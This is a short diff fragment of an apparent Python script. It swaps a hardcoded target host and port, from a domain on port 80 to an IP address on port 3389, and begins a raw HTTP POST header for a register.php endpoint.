@@ -7,8 +7,8 @@ global zzz,is_start
 is_start=0
 zzz=[]
 
-host = "nsoearth.online"
-port = 80
+host = "14.225.204.109"
+port = 3389
 
 headers = """\
 POST /register.php HTTP/1.1\r
